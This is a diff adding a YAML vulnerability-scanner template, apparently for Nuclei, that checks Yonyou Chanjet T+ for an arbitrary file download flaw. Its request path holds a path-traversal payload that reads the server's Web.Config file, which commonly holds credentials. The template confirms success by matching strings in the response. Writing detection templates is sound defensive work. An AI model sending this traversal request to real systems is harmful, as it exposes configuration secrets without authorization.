@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - SYSTEMDB
+            - ProductInfo
+            - <?xml
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config'
+id: yonyou-chanjet-tplus-downloadproxy-filedownload
+info:
+    author: hufei
+    name: yonyou-chanjet-tplus-downloadproxy-filedownload
+    severity: high
+    tags:
+        - yonyou
+        - chanjet
+        - fieldownload
